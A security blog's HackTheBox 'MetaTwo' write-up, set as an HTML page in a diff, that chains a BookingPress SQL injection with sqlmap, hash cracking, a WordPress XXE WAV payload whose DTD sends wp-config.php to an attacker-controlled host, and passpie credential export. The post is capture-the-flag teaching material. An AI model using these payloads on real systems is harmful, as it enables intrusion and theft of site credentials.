@@ -1,0 +1,237 @@
+<!doctype html><html lang=en-us><head><title>HackTheBox MetaTwo | Achla | Inf0Sec</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="A wordpress plugin is vulnerable to unauthenticated sql injection, we exploit this to dump the database
+and hashes of users. Then we can log in as manager user and we found a way to abuse the upload file
+functionality to get creds for ftp. Finally for root we just need to crack a php private key."><meta name=generator content="Hugo 0.107.0"><meta name=ROBOTS content="NOINDEX, NOFOLLOW"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon></head><body><nav class=navigation><a href=/><span class=arrow>←</span>Home</a>
+<a href=/posts>Archive</a>
+<a href=/about>About</a></nav><main class=main><section id=single><h1 class=title>HackTheBox MetaTwo</h1><div class=tip><time datetime="2022-11-19 12:36:39 +0100 +0100">Nov 19, 2022</time>
+<span class=split>·</span>
+<span>1559 words</span>
+<span class=split>·</span>
+<span>8 minute read</span></div><aside class=toc><details><summary>Table of Contents</summary><div><nav id=TableOfContents><ul><li><a href=#nmap><strong>Nmap</strong></a></li><li><a href=#ftp21><strong>FTP:21</strong></a></li><li><a href=#http80><strong>HTTP:80</strong></a></li><li><a href=#sqlmap><strong>SQLMAP</strong></a></li><li><a href=#crack-hash-with-hashcat><strong>Crack hash with Hashcat</strong></a></li><li><a href=#exploit-upload-plugin><strong>Exploit Upload plugin</strong></a></li><li><a href=#from-gpg-to-root><strong>From gpg to root</strong></a></li></ul></nav></div></details></aside><div class=content><p>A wordpress plugin is vulnerable to unauthenticated sql injection, we exploit this to dump the database
+and hashes of users. Then we can log in as manager user and we found a way to abuse the upload file
+functionality to get creds for ftp. Finally for root we just need to crack a php private key.</p><h1 id=introduction><strong>Introduction</strong> <a href=#introduction class=anchor>🔗</a></h1><p>As promise I will post at least one writeup per week and some Tryhackme and CryptoHack contents is coming soon.</p><h2 id=nmap><strong>Nmap</strong> <a href=#nmap class=anchor>🔗</a></h2><p>As always we start with the nmap scan :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># Nmap 7.93 scan initiated Fri Nov 18 18:47:58 2022 as: nmap -sC -sV -o nmap.txt 10.10.11.186
+</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.186
+</span></span><span style=display:flex><span>Host is up (0.021s latency).
+</span></span><span style=display:flex><span>Not shown: 997 closed tcp ports (conn-refused)
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>21/tcp open  ftp?
+</span></span><span style=display:flex><span>| fingerprint-strings:
+</span></span><span style=display:flex><span>|   GenericLines:
+</span></span><span style=display:flex><span>|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+</span></span><span style=display:flex><span>|     Invalid command: try being more creative
+</span></span><span style=display:flex><span>|_    Invalid command: try being more creative
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey:
+</span></span><span style=display:flex><span>|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
+</span></span><span style=display:flex><span>|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
+</span></span><span style=display:flex><span>|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
+</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0
+</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://metapress.htb/
+</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0
+</span></span><span style=display:flex><span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style=display:flex><span>SF-Port21-TCP:V=7.93%I=7%D=11/18%Time=6377C559%P=x86_64-pc-linux-gnu%r(Gen
+</span></span><span style=display:flex><span>SF:ericLines,8F,&#34;220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10
+</span></span><span style=display:flex><span>SF:\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr
+</span></span><span style=display:flex><span>SF:eative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creativ
+</span></span><span style=display:flex><span>SF:e\r\n&#34;);
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span># Nmap done at Fri Nov 18 18:51:25 2022 -- 1 IP address (1 host up) scanned in 207.94 seconds
+</span></span></code></pre></div><p>Nothing special we have 3 classic ports <code>ftp:21</code>, <code>ssh:22</code> and <code>http:80</code>. Let&rsquo;s try ftp first.</p><h2 id=ftp21><strong>FTP:21</strong> <a href=#ftp21 class=anchor>🔗</a></h2><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>┌──(kali㉿kali)-[~/Documents/htb/box/metatwo]
+</span></span><span style=display:flex><span>└─$ ftp 10.10.11.186
+</span></span><span style=display:flex><span>Connected to 10.10.11.186.
+</span></span><span style=display:flex><span>220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+</span></span><span style=display:flex><span>Name (10.10.11.186:kali): anonymous
+</span></span><span style=display:flex><span>331 Password required for anonymous
+</span></span><span style=display:flex><span>Password:
+</span></span><span style=display:flex><span>530 Login incorrect.
+</span></span><span style=display:flex><span>ftp: Login failed
+</span></span><span style=display:flex><span>ftp&gt;
+</span></span></code></pre></div><p>As you can see anonymous login is not permitted so let&rsquo;s ftp away for now
+and dive in http.</p><h2 id=http80><strong>HTTP:80</strong> <a href=#http80 class=anchor>🔗</a></h2><p>After adding <code>metapress.htb</code> to our <code>etc/hosts</code> we can access the website :</p><p><p class=markdown-image><img src=/main_page_metatwo.png alt="image text"></p></p><p>if we click on the link : <strong><a href=http://metapress.htb/events/ target=_blank rel=noopener>http://metapress.htb/events/</a></strong>
+in the first article and then inspect the source code
+we can see in the links tags that it uses bookpress plugin after searching for vulerabilities I found that the <code>1.0.10</code> version is vulnerable to <code>Unauthenticated SQL Injection</code> (more details <strong><a href=https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db235 target=_blank rel=noopener>here</a></strong>).</p><p>From there just I follow the POC given in wpscan&rsquo;s website and capture the request with burpsuite :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; \  --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=7c71a4df9b&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39; -x http://127.0.0.1:8080
+</span></span></code></pre></div><p>Let&rsquo;s switch on burpsuite :</p><p><p class=markdown-image><img src=/burpsuite_capure_request_metatwo.png alt="image text"></p></p><p>After some research the final request should looks like this :</p><p><p class=markdown-image><img src=/final_request_burp.png alt="image text"></p></p><p>Finally just save to file the request to for_sqlmap.req for example.</p><h2 id=sqlmap><strong>SQLMAP</strong> <a href=#sqlmap class=anchor>🔗</a></h2><p>I could perform the attack manually but to be efficient I&rsquo;ll use sqlmap :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>sqlmap -r sqlinjection.req -p total_service --dbs
+</span></span></code></pre></div><p>Again to save time I assume that the parameter <code>total_service</code> is vulnerable. Using the &ndash;dbs argument let us see databases name :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>sqlmap -r forwriteup.req -p total_service --dbs
+</span></span><span style=display:flex><span>        ___
+</span></span><span style=display:flex><span>       __H__
+</span></span><span style=display:flex><span> ___ ___[&#39;]_____ ___ ___  {1.6.10#stable}
+</span></span><span style=display:flex><span>|_ -| . [.]     | .&#39;| . |
+</span></span><span style=display:flex><span>|___|_  [)]_|_|_|__,|  _|
+</span></span><span style=display:flex><span>      |_|V...       |_|   https://sqlmap.org
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[*] starting @ 15:12:56 /2022-11-19/
+</span></span><span style=display:flex><span>...[snip]...
+</span></span><span style=display:flex><span>[15:12:57] [INFO] fetching database names
+</span></span><span style=display:flex><span>available databases [2]:
+</span></span><span style=display:flex><span>[*] blog
+</span></span><span style=display:flex><span>[*] information_schema
+</span></span><span style=display:flex><span>...[snip...]...
+</span></span></code></pre></div><p>Good we know the database name let&rsquo;s dump tables now :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>sqlmap -r forwriteup.req -p total_service -D blog --tables
+</span></span></code></pre></div><p>We got the following output :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>[27 tables]
+</span></span><span style=display:flex><span>+--------------------------------------+
+</span></span><span style=display:flex><span>| wp_bookingpress_appointment_bookings |
+</span></span><span style=display:flex><span>| wp_bookingpress_categories           |
+</span></span><span style=display:flex><span>| wp_bookingpress_customers            |
+</span></span><span style=display:flex><span>| wp_bookingpress_customers_meta       |
+</span></span><span style=display:flex><span>| wp_bookingpress_customize_settings   |
+</span></span><span style=display:flex><span>| wp_bookingpress_debug_payment_log    |
+</span></span><span style=display:flex><span>| wp_bookingpress_default_daysoff      |
+</span></span><span style=display:flex><span>| wp_bookingpress_default_workhours    |
+</span></span><span style=display:flex><span>| wp_bookingpress_entries              |
+</span></span><span style=display:flex><span>| wp_bookingpress_form_fields          |
+</span></span><span style=display:flex><span>| wp_bookingpress_notifications        |
+</span></span><span style=display:flex><span>| wp_bookingpress_payment_logs         |
+</span></span><span style=display:flex><span>| wp_bookingpress_services             |
+</span></span><span style=display:flex><span>| wp_bookingpress_servicesmeta         |
+</span></span><span style=display:flex><span>| wp_bookingpress_settings             |
+</span></span><span style=display:flex><span>| wp_commentmeta                       |
+</span></span><span style=display:flex><span>| wp_comments                          |
+</span></span><span style=display:flex><span>| wp_links                             |
+</span></span><span style=display:flex><span>| wp_options                           |
+</span></span><span style=display:flex><span>| wp_postmeta                          |
+</span></span><span style=display:flex><span>| wp_posts                             |
+</span></span><span style=display:flex><span>| wp_term_relationships                |
+</span></span><span style=display:flex><span>| wp_term_taxonomy                     |
+</span></span><span style=display:flex><span>| wp_termmeta                          |
+</span></span><span style=display:flex><span>| wp_terms                             |
+</span></span><span style=display:flex><span>| wp_usermeta                          |
+</span></span><span style=display:flex><span>| wp_users                             |
+</span></span><span style=display:flex><span>+--------------------------------------+
+</span></span></code></pre></div><p>The table that interests us is : wp_users.
+After dumping it we got 2 entries :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+</span></span><span style=display:flex><span>| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+</span></span><span style=display:flex><span>+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+</span></span><span style=display:flex><span>| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | &lt;blank&gt;             |
+</span></span><span style=display:flex><span>| 2  | &lt;blank&gt;              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | &lt;blank&gt;             |
+</span></span><span style=display:flex><span>+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+</span></span></code></pre></div><p>It&rsquo;s time to crack them.</p><h2 id=crack-hash-with-hashcat><strong>Crack hash with Hashcat</strong> <a href=#crack-hash-with-hashcat class=anchor>🔗</a></h2><p>Unfortunatly the admin hash seems too strong to be cracked using
+rockyou (It takes too long ) but we can crack manager&rsquo;s hash :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>hashcat -m 400 managerhash /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>Within a minute hashcat crack the hash :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:party**********
+</span></span></code></pre></div><p>From there I directly try these creds for ftp but without success. So what can we do ?
+Remember that there is a login page in the website so let&rsquo;s give a try.</p><h2 id=exploit-upload-plugin><strong>Exploit Upload plugin</strong> <a href=#exploit-upload-plugin class=anchor>🔗</a></h2><p>After successfully logged in we are redirected to the profile page :</p><p><p class=markdown-image><img src=/login_success.png alt="image text"></p></p><p>I have noticed an upload page called media library, the first thing
+I tried is to upload a simple php reverse shell but some filter is
+blocking us from upload malicious file.</p><p>Well after looking for vulnerabilities I found out that there is <strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447" target=_blank rel=noopener>CVE</a></strong>
+that involve an XML eXternal Entity vulnerability. This vulnerability let us
+upload a <code>malicious WAVE file</code> that could lead to remote arbitrary file disclosure.</p><p>By following the steps on shown on <strong><a href=https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/ target=_blank rel=noopener>wpsec.com</a></strong> I created two files :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>payload.wav :
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo -en &#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&#34;&#39;&#34;&#39;http://IP:6666/xxe.dtd&#39;&#34;&#39;&#34;&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39; &gt; payload.wav
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>xxe.dtd
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=../wp-config.php&#34;&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;!ENTITY % init &#34;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://IP:6666/?p=%file;&#39;&gt;&#34; &gt;
+</span></span></code></pre></div><p>Now I start a php http server :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>php -S 0.0.0.0:6666
+</span></span></code></pre></div><p>As you can see the payload is uploaded :</p><p><p class=markdown-image><img src=/payload_success.png alt="image text"></p></p><p>In my terminal session I received a base64 encoded information text :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>[Sat Nov 19 22:51:52 2022] PHP 8.1.7 Development Server (http://0.0.0.0:6666) started
+</span></span><span style=display:flex><span>[Sat Nov 19 22:52:03 2022] 10.10.11.186:45686 Accepted
+</span></span><span style=display:flex><span>[Sat Nov 19 22:52:03 2022] 10.10.11.186:45686 [200]: GET /xxe.dtd
+</span></span><span style=display:flex><span>[Sat Nov 19 22:52:03 2022] 10.10.11.186:45686 Closing
+</span></span><span style=display:flex><span>[Sat Nov 19 22:52:03 2022] 10.10.11.186:45694 Accepted
+</span></span><span style=display:flex><span>[Sat Nov 19 22:52:03 2022] 10.10.11.186:45694 [404]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQov
+</span></span><span style=display:flex><span>...[snip]...
+</span></span><span style=display:flex><span>KiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==
+</span></span></code></pre></div><p>After decoding it using <strong><a href=https://gchq.github.io/CyberChef/ target=_blank rel=noopener>CyberChef</a></strong> I got the following output :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;?php
+</span></span><span style=display:flex><span>/** The name of the database for WordPress */
+</span></span><span style=display:flex><span>define( &#39;DB_NAME&#39;, &#39;blog&#39; );
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>/** MySQL database username */
+</span></span><span style=display:flex><span>define( &#39;DB_USER&#39;, &#39;blog&#39; );
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>/** MySQL database password */
+</span></span><span style=display:flex><span>define( &#39;DB_PASSWORD&#39;, &#39;635Aq@TdqrCwXFUZ&#39; );
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>/** MySQL hostname */
+</span></span><span style=display:flex><span>define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>/** Database Charset to use in creating database tables. */
+</span></span><span style=display:flex><span>define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>/** The Database Collate type. Don&#39;t change this if in doubt. */
+</span></span><span style=display:flex><span>define( &#39;DB_COLLATE&#39;, &#39;&#39; );
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>define( &#39;FS_METHOD&#39;, &#39;ftpext&#39; );
+</span></span><span style=display:flex><span>define( &#39;FTP_USER&#39;, &#39;metapress.htb&#39; );
+</span></span><span style=display:flex><span>define( &#39;FTP_PASS&#39;, &#39;********&#39; );
+</span></span><span style=display:flex><span>define( &#39;FTP_HOST&#39;, &#39;ftp.metapress.htb&#39; );
+</span></span><span style=display:flex><span>define( &#39;FTP_BASE&#39;, &#39;blog/&#39; );
+</span></span><span style=display:flex><span>define( &#39;FTP_SSL&#39;, false );
+</span></span><span style=display:flex><span>...[snip]...
+</span></span></code></pre></div><p>Great we got ftp credentials for metapress.htb user.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ftp 10.10.11.186
+</span></span><span style=display:flex><span>Connected to 10.10.11.186.
+</span></span><span style=display:flex><span>220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+</span></span><span style=display:flex><span>Name (10.10.11.186:kali): metapress.htb
+</span></span><span style=display:flex><span>331 Password required for metapress.htb
+</span></span><span style=display:flex><span>Password:
+</span></span><span style=display:flex><span>230 User metapress.htb logged in
+</span></span><span style=display:flex><span>Remote system type is UNIX.
+</span></span><span style=display:flex><span>Using binary mode to transfer files.
+</span></span><span style=display:flex><span>ftp&gt;
+</span></span></code></pre></div><p>Dive in the emailer directory we found a php file : <code>send_email.php</code> which contains
+credentials for jnelson user :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;?php
+</span></span><span style=display:flex><span>/*
+</span></span><span style=display:flex><span> * This script will be used to send an email to all our users when ready for launch
+</span></span><span style=display:flex><span>*/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>use PHPMailer\PHPMailer\PHPMailer;
+</span></span><span style=display:flex><span>use PHPMailer\PHPMailer\SMTP;
+</span></span><span style=display:flex><span>use PHPMailer\PHPMailer\Exception;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>require &#39;PHPMailer/src/Exception.php&#39;;
+</span></span><span style=display:flex><span>require &#39;PHPMailer/src/PHPMailer.php&#39;;
+</span></span><span style=display:flex><span>require &#39;PHPMailer/src/SMTP.php&#39;;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$mail = new PHPMailer(true);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$mail-&gt;SMTPDebug = 3;
+</span></span><span style=display:flex><span>$mail-&gt;isSMTP();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$mail-&gt;Host = &#34;mail.metapress.htb&#34;;
+</span></span><span style=display:flex><span>$mail-&gt;SMTPAuth = true;
+</span></span><span style=display:flex><span>$mail-&gt;Username = &#34;jnelson@metapress.htb&#34;;
+</span></span><span style=display:flex><span>$mail-&gt;Password = &#34;**********&#34;;
+</span></span><span style=display:flex><span>$mail-&gt;SMTPSecure = &#34;tls&#34;;
+</span></span><span style=display:flex><span>$mail-&gt;Port = 587;
+</span></span><span style=display:flex><span>...[snip]...
+</span></span></code></pre></div><p>Use these credentials to connect to ssh and grab the user flag :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>jnelson@meta2:~$ cat user.txt
+</span></span><span style=display:flex><span>e629b0a5aea15********
+</span></span><span style=display:flex><span>jnelson@meta2:~$
+</span></span></code></pre></div><h2 id=from-gpg-to-root><strong>From gpg to root</strong> <a href=#from-gpg-to-root class=anchor>🔗</a></h2><p>By listing all stuff inside jnelson&rsquo;s home directory I noticed an
+unusual hidden directory named .passpie.
+<strong><a href=https://github.com/marcwebbie/passpie target=_blank rel=noopener>Passpie</a></strong> is a command line tool to manage passwords from the terminal with a colorful and configurable interface.</p><p>If we go on .passpie directory an list all files we see another hidden .key file.
+The .key file contains a <code>PGP PUBLIC KEY BLOCK</code> and a <code>PGP PRIVATE KEY BLOCK</code>, of course the first idea
+that came to me is to decrypt the private key with john :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>gpg2john pgp &gt; for_john_pgp
+</span></span><span style=display:flex><span>john for_john_pgp --wordlist=/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>John gives us the password : <code>blink***</code> for this private key, what&rsquo;s next ?</p><p>The passpie command seems to store credentials for jnelson which we already have and for root :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>jnelson@meta2:~$ passpie
+</span></span><span style=display:flex><span>╒════════╤═════════╤════════════╤═══════════╕
+</span></span><span style=display:flex><span>│ Name   │ Login   │ Password   │ Comment   │
+</span></span><span style=display:flex><span>╞════════╪═════════╪════════════╪═══════════╡
+</span></span><span style=display:flex><span>│ ssh    │ jnelson │ ********   │           │
+</span></span><span style=display:flex><span>├────────┼─────────┼────────────┼───────────┤
+</span></span><span style=display:flex><span>│ ssh    │ root    │ ********   │           │
+</span></span><span style=display:flex><span>╘════════╧═════════╧════════════╧═══════════╛
+</span></span></code></pre></div><p>From there using passpie commands I can export those credentials in a file :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>jnelson@meta2:~$ passpie export /tmp/creds.txt
+</span></span><span style=display:flex><span>Passphrase:
+</span></span><span style=display:flex><span>jnelson@meta2:~$
+</span></span></code></pre></div><p>Remember when I cracked PGP private key it gave us a password just reuse it when
+the export command asks for a passphrase and that&rsquo;s it.</p><p>Creds.txt file reveals us the password for root :</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>jnelson@meta2:/tmp$ cat creds.txt
+</span></span><span style=display:flex><span>credentials:
+</span></span><span style=display:flex><span>- comment: &#39;&#39;
+</span></span><span style=display:flex><span>  fullname: root@ssh
+</span></span><span style=display:flex><span>  login: root
+</span></span><span style=display:flex><span>  modified: 2022-06-26 08:58:15.621572
+</span></span><span style=display:flex><span>  name: ssh
+</span></span><span style=display:flex><span>  password: !!python/unicode &#39;p7qfAZt********&#39;
+</span></span><span style=display:flex><span>- comment: &#39;&#39;
+</span></span><span style=display:flex><span>  fullname: jnelson@ssh
+</span></span><span style=display:flex><span>  login: jnelson
+</span></span><span style=display:flex><span>  modified: 2022-06-26 08:58:15.514422
+</span></span><span style=display:flex><span>  name: ssh
+</span></span><span style=display:flex><span>  password: !!python/unicode &#39;Cb4_J******&#39;
+</span></span><span style=display:flex><span>handler: passpie
+</span></span><span style=display:flex><span>version: 1.0
+</span></span></code></pre></div><p>Thanks for reading and see you next week for a new writeup.</p></div><div class=tags><a href=https://achla95.github.io/tags/hackthebox>HackTheBox</a>
+<a href=https://achla95.github.io/tags/pentest>Pentest</a></div></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/achla95 rel=me target=_blank><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64c4.418278.0 8-3.581722 8-8V8c0-4.418278-3.581722-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64c541083001e-24 4.418278 3.581722 8 8 8z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644c0 10.6440272 6.876 19.6751861 16.4145 22.8617681C29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482c-6.6765 1.4562499-8.085-3.2302544-8.085-3.2302544-1.0905-2.7829884-2.664-3.5239139-2.664-3.5239139C17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943c2.4075.1701719 3.675 2.4833051 3.675 2.4833051 2.142 3.6820383 5.6175 2.6188404 6.9855 2.0014024C30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671c0-2.6308879.9345-4.781379 2.4705-6.4665327C22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585c0 0 2.016-.6475568 6.6 2.4697516C31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101c4.581-3.1173084 6.5925-2.4697516 6.5925-2.4697516C49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671c0 9.2555448-5.6115 11.29309-10.9575 11.8894446.860999999999997.7439374 1.629 2.2137408 1.629 4.4621184C41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a><a class=symbol href=https://twitter.com/achla95 rel=me target=_blank><svg fill="#bbb" width="28" height="28" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="438.536" height="438.536" viewBox="0 0 438.536 438.536" 